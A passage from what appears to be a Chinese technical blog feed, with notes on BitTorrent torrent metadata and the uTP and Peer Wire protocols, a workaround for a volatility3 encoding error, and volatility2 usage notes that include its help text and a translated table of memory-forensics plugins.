<li><code>files</code> →
文件列表，每个文件列表下面是包括每一个单文件的信息，文件信息是个字典</li>
</ul>
<p>而 <code>info</code> 中的内容是种子文件中的重中之重，在 DHT
网络中保留的内容就是 <code>info</code> 字段的内容。</p>
<p>而磁力链接中的 <code>infohash</code> 便是根据 <code>info</code>
字段的内容计算的，<code>info</code> 字段的 <code>pieces</code>
字段为每个数据块的校验值，作用便是验证下载的文件是否正确。</p>
<p>要注意的是 <code>info</code>字段的下载也是分块的下载完成后使用
<code>infohash</code> 进行校验。</p>
<p>所以，我们可以知道，磁力链接下载文件分成两个步骤：</p>
<ol type="1">
<li>根据 <code>infohash</code> 下载种子文件的 <code>info</code>
字段，注意到种子文件并不是必须的。</li>
<li>再根据 <code>info</code>
下载源文件，将每一个数据块进行校验，不一致则重新下载。</li>
</ol>
<p>需要注意的是，一般的种子文件会包含 <code>announce</code>，也就是
tracker 服务器的地址，如果没有 tracker 服务器，文件中可能会包含
<code>nodes</code>，<code>nodes</code> 是存有种子信息的
<strong>peer</strong> 节点，这样的种子文件就是
<code>trackerless torrent</code>。如果有 nodes 客户端直接从
<code>nodes</code> 获取种子信息，而从 DHT 网络中下载下来的种子文件既没有
<code>annouce</code> 也没有 <code>nodes</code>，客户端只能通过
<code>info</code> 字段计算出 <code>hashinfo</code>，再从
<code>bootstrap node</code> 节点开始在 DHT 网络中寻找种子信息。</p>
<h1 id="utp-协议">uTP 协议</h1>
<p><code>uTP</code> 是一个基于 UDP 的开放的 BT 点对点文件共享协议。</p>
<p>在<code>uTP</code>协议出现之前，BT下载会占用网络中大量的链接，直接导致其它网络应用服务质量下载和网络的拥堵，因此有很多ISP都开始限制BT的下载。<code>uTP</code>减轻了网络延迟并解决了传统的基于TCP的BT协议所遇到的拥塞控制问题，提供可靠的有序的传送。</p>
<p>一个有效的 <code>uTP</code> 数据包包含下面格式的报头：</p>
<figure>
<img src="/torrent-note/uTP-header.png" alt="uTP-header">
<figcaption aria-hidden="true">uTP-header</figcaption>
</figure>
<p>其中，我们最为关心的是
<code>type</code>、<code>connection id</code>、<code>seq_nr</code>和<code>ack_nr</code>
这几个值。<code>type</code> 字段表示包类型，uTP的包类型有下面5种：</p>
<ul>
<li><code>ST_DATA</code> = 0 → 最重要的数据包，uTP
就是使用该类型的包传送数据</li>
<li><code>ST_FIN</code> = 1 → 关闭连接，这是 uTP
连接的最后一个包，类似于 TCP 中的 FIN</li>
<li><code>ST_STATE</code> = 2 →
简单的应答包，表明已从对方收到了数据包，该包不包含任何数据，<code>seq_nr</code>
值不变</li>
<li><code>ST_RESET</code> = 3 → 终止连接，类似于 TCP 中的
<code>RST</code></li>
<li><code>ST_SYN</code> = 4 → 初始化连接，类似于 TCP 中的
<code>SYN</code>，这是 uTP 连接的第一个包</li>
</ul>
<p>关于 <code>uTP</code> 协议的内容参考官方文档<a href="http://www.bittorrent.org/beps/bep_0029.html">BEP-029</a>。</p>
<p><code>uTP</code> 的一个很重要的特点是使用 <code>connection id</code>
来标识一次连接，而不是每个包算一次连接。所以在分析 <code>ST_DATA</code>
时，需要注意找所有 <code>connection id</code> 相同的数据包，然后按
<code>seq_nr</code> 排序，<code>seq_nr</code> 应该是依次递增的（注意
<code>ST_STATE</code> 包不会增加<code>seq_nr</code>值），如果发现两个
<code>ST_DATA</code> 的 <code>seq_nr</code>
值相同则说明后面那个报文是重复报文需要忽略掉，如果发现两个
<code>ST_DATA</code> 的 <code>seq_nr</code>
值不是连续的，中间差了一个或多个，则可能是由于网络原因发生了丢包现象，数据包将不可用。</p>
<p>下图是一个简单的 <code>ST_SYN</code> 包：</p>
<figure>
<img src="/torrent-note/st_syn.png" alt="st_syn">
<figcaption aria-hidden="true">st_syn</figcaption>
</figure>
<h1 id="peer-wire协议">Peer Wire协议</h1>
<p><code>Peer Wire</code>
协议是Peer之间的通信协议，通常由一个握手消息开始。握手消息的格式是这样的：<code>&lt;pstrlen&gt;&lt;pstr&gt;&lt;reserved&gt;&lt;info_hash&gt;&lt;peer_id&gt;</code>
下面是一个握手报文的示例：</p>
<figure>
<img src="/torrent-note/handshake.png" alt="handshake">
<figcaption aria-hidden="true">handshake</figcaption>
</figure>
<p>关于 <code>Peer Wire</code> 协议的详细内容，请参考<a href="https://wiki.theory.org/BitTorrentSpecification">BitTorrent的规范</a>。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>torrent</tag>
      </tags>
  </entry>
  <entry>
    <title>vol3-gbk-error</title>
    <url>//errors/vol3-gbk-error.html</url>
    <content><![CDATA[<h1 id="错误分析">错误分析</h1>
<p>未知错误，可能是扫描过程中出现非法编码造成的异常</p>
<figure>
<img src="/errors/vol3-gbk-error/UnicodeEncodeError.png" alt="UnicodeEncodeError">
<figcaption aria-hidden="true">UnicodeEncodeError</figcaption>
</figure>
<h1 id="解决错误">解决错误</h1>
<p>打开异常最先出现的位置
<code>./volatility3/cli/text_renderer.py</code> 定位
<code>line 173</code></p>
<figure>
<img src="/errors/vol3-gbk-error/visitor.png" alt="visitor">
<figcaption aria-hidden="true">visitor</figcaption>
</figure>
<p>修改代码为</p>
<figure>
<img src="/errors/vol3-gbk-error/after.png" alt="after">
<figcaption aria-hidden="true">after</figcaption>
</figure>
<p>此法为暴力破解，可以解决程序因抛出异常后中断执行问题
(处理方式为不处理异常继续运行程序)</p>
]]></content>
      <tags>
        <tag>error</tag>
        <tag>volatility3</tag>
      </tags>
  </entry>
  <entry>
    <title>volatility2 使用笔记</title>
    <url>//vol2-note.html</url>
    <content><![CDATA[<h1 id="volatility2-安装">volatility2 安装</h1>
<p>在 GitHub
主页中可以直接获取源码：https://github.com/volatilityfoundation/volatility</p>
<p>直接使用源码运行即可，同时在官网也可以获取到可直接运行的版本：https://www.volatilityfoundation.org/releases</p>
<p>需要注意的是，volatility2 所需的运行环境为
Python2，且存在一些依赖库。</p>
<h1 id="volatility2-使用">volatility2 使用</h1>
<h2 id="参数">参数</h2>
<p>使用 <code>python2 vol.py -h</code> 可获取到帮助信息：</p>
<blockquote>
<p>Options: -h, --help list all available options and their default
values. Default values may be set in the configuration file
(/etc/volatilityrc) --conf-file=.volatilityrc User based configuration
file -d, --debug Debug volatility --plugins=PLUGINS Additional plugin
directories to use (semi-colon separated) --info Print information about
all registered objects --cache-directory=C:\53124/.cache Directory where
cache files are stored --cache Use caching --tz=TZ Sets the (Olson)
timezone for displaying timestamps using pytz (if installed) or tzset -f
FILENAME, --filename=FILENAME Filename to use when opening an image
--profile=WinXPSP2x86 Name of the profile to load (use --info to see a
list of supported profiles) -l LOCATION, --location=LOCATION A URN
location from which to load an address space -w, --write Enable write
support --dtb=DTB DTB Address --output=text Output in this format
(support is module specific, see the Module Output Options below)
--output-file=OUTPUT_FILE Write output in this file -v, --verbose
Verbose information --shift=SHIFT Mac KASLR shift address
--physical_shift=PHYSICAL_SHIFT Linux kernel physical shift address
--virtual_shift=VIRTUAL_SHIFT Linux kernel virtual shift address -g
KDBG, --kdbg=KDBG Specify a KDBG virtual address (Note: for 64-bit
Windows 8 and above this is the address of KdCopyDataBlock) --force
Force utilization of suspect profile -k KPCR, --kpcr=KPCR Specify a
specific KPCR address --cookie=COOKIE Specify the address of
nt!ObHeaderCookie (valid for Windows 10 only)</p>
</blockquote>
<p>一般来说常用的参数格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f file.raw plugins [args]</span><br></pre></td></tr></table></figure>
<p>例如获取内存镜像的环境信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f file.raw imageinfo</span><br></pre></td></tr></table></figure>
<p>或者是转储文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f file.raw dumpfiles --dump-dir .</span><br></pre></td></tr></table></figure>
<h2 id="插件明细">插件明细</h2>
<table>
<colgroup>
<col style="width: 30%">
<col style="width: 69%">
</colgroup>
<thead>
<tr class="header">
<th>插件名</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>amcache</td>
<td>打印 AmCache 信息</td>
</tr>
<tr class="even">
<td>apihooks</td>
<td>检测进程和内核内存中的 API 钩子 (hooks)</td>
</tr>
<tr class="odd">
<td>atoms</td>
<td>打印会话和窗口站原子表</td>
</tr>
<tr class="even">
<td>atomscan</td>
<td>原子表池扫描器</td>
</tr>
<tr class="odd">
<td>auditpol</td>
<td>从 <code>HKLM\SECURITY\Policy\PolAdtEv</code> 打印审计策略</td>
</tr>
<tr class="even">
<td>bigpools</td>
<td>使用 <code>BigPagePoolScanner</code> 转储大页面池</td>
</tr>
<tr class="odd">
<td>bioskbd</td>
<td>从 <code>Real Mode</code> 内存中读取键盘缓冲区</td>
</tr>
<tr class="even">
<td>cachedump</td>
<td>从内存中转储缓存的域哈希值</td>
</tr>
<tr class="odd">
<td>callbacks</td>
<td>打印整个系统的回调和通知进程</td>
</tr>
<tr class="even">
<td>clipboard</td>
<td>提取 Windows 剪贴板的内容</td>
</tr>
<tr class="odd">
<td>cmdline</td>
<td>显示进程的命令行参数</td>
</tr>
<tr class="even">
<td>cmdscan</td>
<td>通过扫描 <code>_COMMAND_HISTORY</code> 提取命令历史记录</td>
</tr>
<tr class="odd">
<td>connections</td>
<td>打印开放的连接列表 [仅适用于Windows XP和2003]</td>
</tr>
<tr class="even">
<td>connscan</td>
<td>连接池中扫描 tcp 连接</td>
</tr>
<tr class="odd">
<td>consoles</td>
<td>通过扫描 <code>_CONSOLE_INFORMATION</code> 来提取命令历史记录</td>
</tr>
<tr class="even">
<td>crashinfo</td>
<td>转储崩溃转储信息</td>
</tr>
<tr class="odd">
<td>deskscan</td>
<td>标签 DESKTOP（台式机）的池扫描器</td>
</tr>
<tr class="even">
<td>devicetree</td>
<td>以树状图形式显示驱动</td>
</tr>
<tr class="odd">
<td>dlldump</td>
<td>从进程地址空间转储 DLL</td>
</tr>
<tr class="even">
<td>dlllist</td>
<td>打印每个进程的加载的 DLL 列表</td>
</tr>
<tr class="odd">
<td>driverirp</td>
<td>驱动程序 IRP 挂钩检测</td>
</tr>
<tr class="even">
<td>drivermodule</td>
<td>将驱动程序对象关联到内核模块</td>
</tr>
<tr class="odd">
<td>driverscan</td>
<td>驱动程序对象的池扫描程序</td>
</tr>
<tr class="even">
<td>dumpcerts</td>
<td>转储 RSA 的私有和公共 SSL 密钥</td>
</tr>
<tr class="odd">
<td>dumpfiles</td>
<td>提取内存映射和缓存文件</td>
</tr>
<tr class="even">
<td>dumpregistry</td>
<td>将注册表文件转储到磁盘</td>
</tr>
<tr class="odd">
<td>editbox</td>
<td>显示有关编辑控件的信息</td>
</tr>
<tr class="even">
<td>envars</td>
<td>显示进程环境变量</td>
</tr>
<tr class="odd">
<td>eventhooks</td>
<td>打印 Windows 事件挂钩的详细信息</td>
</tr>
<tr class="even">
<td>evtlogs</td>
<td>提取 Windows 事件日志（仅限 XP/2003）</td>
</tr>
<tr class="odd">
<td>filescan</td>
<td>输出所有文件对象</td>
</tr>
<tr class="even">
<td>gahti</td>
<td>转储 USER 句柄类型信息</td>
</tr>
<tr class="odd">
<td>gditimers</td>
<td>打印已安装的 GDI 计时器和回调</td>
</tr>
<tr class="even">
<td>gdt</td>
<td>显示全局描述符表</td>
</tr>
<tr class="odd">
<td>getservicesids</td>
<td>获取注册表中的服务名称并返回计算的SID</td>
</tr>
<tr class="even">
<td>getsids</td>
<td>打印属于每个进程的 SID</td>
</tr>
<tr class="odd">
<td>handles</td>
<td>打印每个进程的打开的句柄列表</td>
</tr>
<tr class="even">
<td>hashdump</td>
<td>从内存中转储密码哈希 (LM/NTLM)</td>
</tr>
<tr class="odd">
<td>hibinfo</td>
<td>转储休眠文件信息</td>
</tr>
<tr class="even">
<td>hivedump</td>
<td>转出注册表单元</td>
</tr>
<tr class="odd">
<td>hivelist</td>
<td>打印注册表配置单元列表。</td>
</tr>
<tr class="even">
<td>hivescan</td>
<td>注册表配置单元的池扫描器</td>
</tr>
<tr class="odd">
<td>hpakextract</td>
<td>从 HPAK 文件中提取物理内存</td>
</tr>
<tr class="even">
<td>hpakinfo</td>
<td>关于 HPAK 文件的信息</td>
</tr>
<tr class="odd">
<td>idt</td>
<td>显示中断描述符表</td>
</tr>
<tr class="even">
<td>iehistory</td>
<td>重建 Internet Explorer 缓存/历史</td>
</tr>
<tr class="odd">
<td>imagecopy</td>
<td>将物理地址空间复制为原始 DD 映像</td>
</tr>
<tr class="even">
<td>imageinfo</td>
<td>识别映像的信息</td>
</tr>
<tr class="odd">
<td>impscan</td>
<td>扫描对导入函数的调用</td>
</tr>
<tr class="even">
<td>joblinks</td>
<td>打印进程作业链接信息</td>
</tr>
<tr class="odd">
<td>kdbgscan</td>
<td>搜索并转储潜在的 KDBG 值</td>
</tr>
<tr class="even">
<td>kpcrscan</td>
<td>搜索并转储潜在的 KPCR 值</td>
</tr>
<tr class="odd">
<td>ldrmodules</td>
<td>检测未链接的 DLL</td>
</tr>
<tr class="even">
<td>limeinfo</td>
<td>转储 Lime 文件格式信息</td>
</tr>
<tr class="odd">
<td>linux_apihooks</td>
<td>检查用户区 apihooks 情况</td>
</tr>
<tr class="even">
<td>linux_arp</td>
<td>打印 ARP 表</td>
</tr>
<tr class="odd">
<td>linux_aslr_shift</td>
<td>自动检测 Linux ASLR shift</td>
</tr>
<tr class="even">
<td>linux_banner</td>
<td>打印 Linux 横幅信息</td>
</tr>
<tr class="odd">
<td>linux_bash</td>
<td>从 bash 进程内存中恢复 bash 历史记录</td>
</tr>
<tr class="even">
<td>linux_bash_env</td>
<td>恢复进程的动态环境变量</td>
</tr>
<tr class="odd">
<td>linux_bash_hash</td>
<td>从 bash 进程内存中恢复 bash 哈希表</td>
</tr>
<tr class="even">
<td>linux_check_afinfo</td>
<td>验证网络协议的操作函数指针</td>
</tr>
<tr class="odd">
<td>linux_check_creds</td>
<td>检查是否有任何进程共享凭证结构</td>
</tr>
<tr class="even">
<td>linux_check_evt_arm</td>
<td>检查异常向量表以查找系统调用表挂钩</td>
</tr>
<tr class="odd">
<td>linux_check_fop</td>
<td>检查文件操作结构以查找 rootkit 修改</td>
</tr>
<tr class="even">
<td>linux_check_idt</td>
<td>检查 IDT 是否已被更改</td>
</tr>
<tr class="odd">
<td>linux_check_inline_kernel</td>
<td>检查内联内核挂钩</td>
</tr>
<tr class="even">
<td>linux_check_modules</td>
<td>将模块列表与 sysfs 信息进行比较（如果可用）</td>
</tr>
<tr class="odd">
<td>linux_check_syscall</td>
<td>检查系统调用表是否已更改</td>
</tr>
<tr class="even">
<td>linux_check_syscall_arm</td>
<td>检查系统调用表是否已更改</td>
</tr>
<tr class="odd">
<td>linux_check_tty</td>
<td>检查 tty 设备的挂钩</td>
</tr>
<tr class="even">
<td>linux_cpuinfo</td>
<td>打印有关每个活动处理器的信息</td>
</tr>
<tr class="odd">
<td>linux_dentry_cache</td>
<td>从 dentry 缓存中收集文件</td>
</tr>
<tr class="even">
<td>linux_dmesg</td>
<td>收集 dmesg 缓冲区</td>
</tr>
<tr class="odd">
<td>linux_dump_map</td>
<td>将选定的内存映射写入磁盘</td>
</tr>
<tr class="even">
<td>linux_dynamic_env</td>
<td>恢复进程的动态环境变量</td>
</tr>
<tr class="odd">
<td>linux_elfs</td>
<td>在进程映射中查找 ELF 二进制文件</td>
</tr>
<tr class="even">
<td>linux_enumerate_files</td>
<td>列出文件系统缓存引用的文件</td>
</tr>
<tr class="odd">
<td>linux_find_file</td>
<td>列出并从内存中恢复文件</td>
</tr>
<tr class="even">
<td>linux_getcwd</td>
<td>列出每个进程的当前工作目录</td>
</tr>
<tr class="odd">
<td>linux_hidden_modules</td>
<td>雕刻内存以查找隐藏的内核模块</td>
</tr>
<tr class="even">
<td>linux_ifconfig</td>
<td>收集活动接口</td>
</tr>
<tr class="odd">
<td>linux_info_regs</td>
<td>就像 GDB 中的“信息寄存器”（它将打印出所有寄存器）</td>
</tr>
<tr class="even">
<td>linux_iomem</td>
<td>提供类似于 <code>/proc/iomem</code> 的输出</td>
</tr>
<tr class="odd">
<td>linux_kernel_opened_files</td>
<td>列出从内核中打开的文件</td>
</tr>
<tr class="even">
<td>linux_keyboard_notifiers</td>
<td>解析键盘通知程序调用链</td>
</tr>
<tr class="odd">
<td>linux_ldrmodules</td>
<td>将 proc maps 的输出与 libdl 中的库列表进行比较</td>
</tr>
<tr class="even">
<td>linux_library_list</td>
<td>列出加载到进程中的库</td>
</tr>
<tr class="odd">
<td>linux_librarydump</td>
<td>将进程内存中的共享库转储到磁盘</td>
</tr>
<tr class="even">
<td>linux_list_raw</td>
<td>列出具有混杂套接字的应用程序</td>
</tr>
<tr class="odd">
<td>linux_lsmod</td>
<td>收集加载的内核模块</td>
</tr>
<tr class="even">
<td>linux_lsof</td>
<td>列出文件描述符及其路径</td>
</tr>
<tr class="odd">
<td>linux_malfind</td>
<td>查找可疑进程映射</td>
</tr>
<tr class="even">
<td>linux_memmap</td>
<td>转储 linux 任务的内存映射</td>
</tr>
<tr class="odd">
<td>linux_moddump</td>
<td>提取加载的内核模块</td>
</tr>
<tr class="even">
<td>linux_mount</td>
<td>收集已安装的 fs/设备</td>
</tr>
<tr class="odd">
<td>linux_mount_cache</td>
<td>从 kmem_cache 收集已安装的 fs/驱动</td>
</tr>
<tr class="even">
<td>linux_netfilter</td>
<td>列出 Netfilter 钩子</td>
</tr>
<tr class="odd">
<td>linux_netscan</td>
<td>列出网络连接结构</td>
</tr>
<tr class="even">
<td>linux_netstat</td>
<td>列出打开的套接字</td>
</tr>
<tr class="odd">
<td>linux_pidhashtable</td>
<td>通过 PID 哈希表枚举进程</td>
</tr>
<tr class="even">
<td>linux_pkt_queues</td>
<td>将每个进程的数据包队列写入磁盘</td>
</tr>
<tr class="odd">
<td>linux_plthook</td>
<td>扫描 ELF 二进制文件的 PLT 以查找非需要图像的挂钩</td>
</tr>
<tr class="even">
<td>linux_proc_maps</td>
<td>收集进程内存映射</td>
</tr>
<tr class="odd">
<td>linux_proc_maps_rb</td>
<td>通过映射红黑树为 linux 收集 proc maps</td>
</tr>
<tr class="even">
<td>linux_procdump</td>
<td>将进程的可执行映像转储到磁盘</td>
</tr>
<tr class="odd">
<td>linux_process_hollow</td>
<td>检查进程空心的迹象</td>
</tr>
<tr class="even">
<td>linux_psaux</td>
<td>收集进程以及完整的命令行和开始时间</td>
</tr>
<tr class="odd">
<td>linux_psenv</td>
<td>收集进程及其静态环境变量</td>
</tr>
<tr class="even">
<td>linux_pslist</td>
<td>通过遍历 task_struct-&gt; 任务列表来收集活动任务</td>
</tr>
<tr class="odd">
<td>linux_pslist_cache</td>
<td>从 kmem_cache 收集任务</td>
</tr>
<tr class="even">
<td>linux_psscan</td>
<td>扫描进程的物理内存</td>
</tr>
<tr class="odd">
<td>linux_pstree</td>
<td>显示进程之间的父/子关系</td>
</tr>
<tr class="even">
<td>linux_psxview</td>
<td>使用各种进程列表查找隐藏进程</td>
</tr>
<tr class="odd">
<td>linux_recover_filesystem</td>
<td>从内存中恢复整个缓存文件系统</td>
</tr>
<tr class="even">
<td>linux_route_cache</td>
<td>从内存中恢复路由缓存</td>
</tr>
<tr class="odd">
<td>linux_sk_buff_cache</td>
<td>从 sk_buff kmem_cache 恢复数据包</td>
</tr>
<tr class="even">
<td>linux_slabinfo</td>
<td>在运行的机器上模拟 /proc/slabinfo</td>
</tr>
<tr class="odd">
<td>linux_strings</td>
<td>将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）</td>
</tr>
<tr class="even">
<td>linux_threads</td>
<td>打印进程的线程</td>
</tr>
<tr class="odd">
<td>linux_tmpfs</td>
<td>从内存中恢复 tmpfs 文件系统</td>
</tr>
<tr class="even">
<td>linux_truecrypt_passphrase</td>
<td>恢复缓存的 Truecrypt 密码短语</td>
</tr>
<tr class="odd">
<td>linux_vma_cache</td>
<td>从 vm_area_struct 缓存中收集 VMA</td>
</tr>
<tr class="even">
<td>linux_volshell</td>
<td>内存镜像中的外壳 shell</td>
</tr>
<tr class="odd">
<td>linux_yarascan</td>
<td>Linux 内存映像中的 shell</td>
</tr>
<tr class="even">
<td>lsadump</td>
<td>从注册表中转储（解密）LSA 机密</td>
</tr>
<tr class="odd">
<td>mac_adium</td>
<td>列出 Adium 消息</td>
</tr>
<tr class="even">
<td>mac_apihooks</td>
<td>检查进程中的 API 挂钩</td>
</tr>
<tr class="odd">
<td>mac_apihooks_kernel</td>
<td>检查系统调用和内核函数是否被挂钩</td>
</tr>
<tr class="even">
<td>mac_arp</td>
<td>打印 arp 表</td>
</tr>
<tr class="odd">
<td>mac_bash</td>
<td>从 bash 进程内存中恢复 bash 历史记录</td>
</tr>
<tr class="even">
<td>mac_bash_env</td>
<td>恢复 bash 的环境变量</td>
</tr>
<tr class="odd">
<td>mac_bash_hash</td>
<td>恢复来自 bash 进程内存的 bash 哈希表</td>
</tr>
<tr class="even">
<td>mac_calendar</td>
<td>从 Calendar.app 获取日历事件</td>
</tr>
<tr class="odd">
<td>mac_check_fop</td>
<td>验证文件操作指针</td>
</tr>
<tr class="even">
<td>mac_check_mig_table</td>
<td>列出内核 MIG 表中的全部内容</td>
</tr>
<tr class="odd">
<td>mac_check_syscall_shadow</td>
<td>查找影子系统调用表</td>
</tr>
<tr class="even">
<td>mac_check_syscalls</td>
<td>检查系统调用表条目是否已挂钩</td>
</tr>
<tr class="odd">
<td>mac_check_sysctl</td>
<td>检查未知的 sysctl 处理程序</td>
</tr>
<tr class="even">
<td>mac_check_trap_table</td>
<td>检查马赫陷阱表条目是否已挂钩</td>
</tr>
<tr class="odd">
<td>mac_compressed_swap</td>
<td>打印 Mac OS X VM 压缩器统计信息和转储所有压缩页面</td>
</tr>
<tr class="even">
<td>mac_contacts</td>
<td>从 <code>Contacts.app</code> 获取联系人名称</td>
</tr>
<tr class="odd">
<td>mac_dead_procs</td>
<td>打印终止/取消分配的进程</td>
</tr>
<tr class="even">
<td>mac_dead_sockets</td>
<td>打印终止/取消分配的网络套接字</td>
</tr>
<tr class="odd">
<td>mac_dead_vnodes</td>
<td>列出释放的 vnode 结构</td>
</tr>
<tr class="even">
<td>mac_devfs</td>
<td>列出文件缓存中的文件</td>
</tr>
<tr class="odd">
<td>mac_dmesg</td>
<td>打印内核调试缓冲区</td>
</tr>
<tr class="even">
<td>mac_dump_file</td>
<td>转储指定文件</td>
</tr>
<tr class="odd">
<td>mac_dump_maps</td>
<td>转储进程的内存范围，可选地包括压缩交换中的页面</td>
</tr>
<tr class="even">
<td>mac_dyld_maps</td>
<td>从 dyld 数据结构获取进程的内存映射</td>
</tr>
<tr class="odd">
<td>mac_find_aslr_shift</td>
<td>查找 10.8 的 ASLR 移位值+ 图像</td>
</tr>
<tr class="even">
<td>mac_get_profile</td>
<td>自动检测 Mac 配置文件</td>
</tr>
<tr class="odd">
<td>mac_ifconfig</td>
<td>列出所有设备的网络接口信息</td>
</tr>
<tr class="even">
<td>mac_interest_handlers</td>
<td>列出 IOKit 兴趣处理程序</td>
</tr>
<tr class="odd">
<td>mac_ip_filters</td>
<td>报告任何挂钩的 IP 过滤器</td>
</tr>
<tr class="even">
<td>mac_kernel_classes</td>
<td>列出内核中加载的 c++ 类</td>
</tr>
<tr class="odd">
<td>mac_kevents</td>
<td>显示进程的父/子关系</td>
</tr>
<tr class="even">
<td>mac_keychaindump</td>
<td>恢复可能的钥匙串密钥。使用 chainbreaker 打开相关的钥匙串文件</td>
</tr>
<tr class="odd">
<td>mac_ldrmodules</td>
<td>将 proc 映射的输出与 libdl 中的库列表进行比较</td>
</tr>
<tr class="even">
<td>mac_librarydump</td>
<td>转储进程的可执行文件</td>
</tr>
<tr class="odd">
<td>mac_list_files</td>
<td>列出文件缓存中的文件</td>
</tr>
<tr class="even">
<td>mac_list_kauth_listeners</td>
<td>列出 Kauth 范围侦听器</td>
</tr>
<tr class="odd">
<td>mac_list_kauth_scopes</td>
<td>列出 Kauth 范围和他们的状态</td>
</tr>
<tr class="even">
<td>mac_list_raw</td>
<td>列出具有混杂套接字的应用程序</td>
</tr>
<tr class="odd">
<td>mac_list_sessions</td>
<td>枚举会话</td>
</tr>
<tr class="even">
<td>mac_list_zones</td>
<td>打印活动区域</td>
</tr>
<tr class="odd">
<td>mac_lsmod</td>
<td>列出加载的内核模块</td>
</tr>
<tr class="even">
<td>mac_lsmod_iokit</td>
<td>列出通过 IOkit 加载的内核模块</td>
</tr>
<tr class="odd">
<td>mac_lsmod_kext_map</td>
<td>列出加载的内核模块</td>
</tr>
<tr class="even">
<td>mac_lsof</td>
<td>列出每个进程打开的文件</td>
</tr>
<tr class="odd">
<td>mac_machine_info</td>
<td>打印有关示例的机器信息</td>
</tr>
<tr class="even">
<td>mac_malfind</td>
<td>查找可疑进程映射</td>
</tr>
<tr class="odd">
<td>mac_memdump</td>
<td>将可寻址内存页转储到文件</td>
</tr>
<tr class="even">
<td>mac_moddump</td>
<td>将指定的内核扩展写入磁盘</td>
</tr>
<tr class="odd">
<td>mac_mount</td>
<td>打印已安装的设备信息</td>
</tr>
<tr class="even">
<td>mac_netstat</td>
<td>列出每个进程的活动网络连接</td>
</tr>
<tr class="odd">
<td>mac_network_conns</td>
<td>列出来自内核网络结构的网络连接</td>
</tr>
<tr class="even">
<td>mac_notesapp</td>
<td>查找 Notes 消息的内容</td>
</tr>
<tr class="odd">
<td>mac_notifiers</td>
<td>检测向 I/O Kit（例如 LogKext）添加挂钩的 rootkit</td>
</tr>
<tr class="even">
<td>mac_orphan_threads</td>
<td>列出不映射回已知模块/进程的线程</td>
</tr>
<tr class="odd">
<td>mac_pgrp_hash_table</td>
<td>步行进程组哈希表</td>
</tr>
<tr class="even">
<td>mac_pid_hash_table</td>
<td>遍历 pid 哈希表</td>
</tr>
<tr class="odd">
<td>mac_print_boot_cmdline</td>
<td>打印内核启动参数</td>
</tr>
<tr class="even">
<td>mac_proc_maps</td>
<td>获取进程的内存映射</td>
</tr>
<tr class="odd">
<td>mac_procdump</td>
<td>转储进程的可执行文件</td>
</tr>
<tr class="even">
<td>mac_psaux</td>
<td>打印带有用户空间参数的进程 (<code>**argv</code>)</td>
</tr>
<tr class="odd">
<td>mac_psenv</td>
<td>打印用户区环境中的进程 (<code>**envp</code>)</td>
</tr>
<tr class="even">
<td>mac_pslist</td>
<td>列出正在运行的进程</td>
</tr>
<tr class="odd">
<td>mac_pstree</td>
<td>显示进程的父/子关系</td>
</tr>
<tr class="even">
<td>mac_psxview</td>
<td>使用各种进程列表查找隐藏进程</td>
</tr>
<tr class="odd">
<td>mac_recover_filesystem</td>
<td>恢复缓存的文件系统</td>
</tr>
<tr class="even">
<td>mac_route</td>
<td>打印路由表</td>
</tr>
<tr class="odd">
<td>mac_socket_filters</td>
<td>报告套接字过滤器</td>
</tr>
<tr class="even">
<td>mac_strings</td>
<td>将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）</td>
</tr>
<tr class="odd">
<td>mac_tasks</td>
<td>列出活动任务</td>
</tr>
<tr class="even">
<td>mac_threads</td>
<td>列出进程线程</td>
</tr>
<tr class="odd">
<td>mac_threads_simple</td>
<td>列出线程及其开始时间和优先级</td>
</tr>
<tr class="even">
<td>mac_timers</td>
<td>报告内核驱动程序设置的计时器</td>
</tr>
<tr class="odd">
<td>mac_trustedbsd</td>
<td>列出恶意的 trustedbsd 策略</td>
</tr>
<tr class="even">
<td>mac_version</td>
<td>打印Mac版本</td>
</tr>
<tr class="odd">
<td>mac_vfsevents</td>
<td>列出过滤文件系统事件的进程</td>
</tr>
<tr class="even">
<td>mac_volshell</td>
<td>内存映像中的 shell</td>
</tr>
<tr class="odd">
<td>mac_yarascan</td>
<td>扫描内存对于 yara 签名</td>
</tr>
<tr class="even">
<td>machoinfo</td>
<td>转储 Mach-O 文件格式信息</td>
</tr>
<tr class="odd">
<td>malfind</td>
<td>查找隐藏和注入的代码</td>
</tr>
<tr class="even">
<td>mbrparser</td>
<td>扫描并解析潜在的主引导记录 (MBR)</td>
</tr>
<tr class="odd">
<td>memdump</td>
<td>转储进程的可寻址内存</td>
</tr>
<tr class="even">
<td>memmap</td>
<td>打印内存映射</td>
</tr>
<tr class="odd">
<td>messagehooks</td>
<td>列出桌面和线程窗口消息挂钩</td>
</tr>
<tr class="even">
<td>mftparser</td>
<td>扫描并解析潜在的 MFT 条目</td>
</tr>
<tr class="odd">
<td>moddump</td>
<td>将内核驱动程序转储到可执行文件示例</td>
</tr>
<tr class="even">
<td>modscan</td>
<td>内核池扫描程序modules</td>
</tr>
<tr class="odd">
<td>modules</td>
<td>打印加载模块的列表</td>
</tr>
<tr class="even">
<td>multiscan</td>
<td>一次性扫描各种对象</td>
</tr>
<tr class="odd">
<td>mutantscan</td>
<td>互斥对象的池扫描器</td>
</tr>
<tr class="even">
<td>netscan</td>
<td>扫描 Vista（或更高版本）图像的连接和套接字</td>
</tr>
<tr class="odd">
<td>notepad</td>
<td>列出当前显示的记事本文本</td>
</tr>
<tr class="even">
<td>objtypescan</td>
<td>扫描 Windows 对象类型对象</td>
</tr>
<tr class="odd">
<td>patcher</td>
<td>根据页面扫描修补内存</td>
</tr>
<tr class="even">
<td>poolpeek</td>
<td>可配置池扫描器插件</td>
</tr>
<tr class="odd">
<td>pooltracker</td>
<td>显示池标记使用摘要</td>
</tr>
<tr class="even">
<td>printkey</td>
<td>打印注册表项及其子项和值</td>
</tr>
<tr class="odd">
<td>privs</td>
<td>显示进程权限</td>
</tr>
<tr class="even">
<td>procdump</td>
<td>将进程转储到可执行文件示例</td>
</tr>
<tr class="odd">
<td>pslist</td>
<td>按照 EPROCESS 列表打印所有正在运行的进程</td>
</tr>
<tr class="even">
<td>psscan</td>
<td>进程对象的池扫描程序</td>
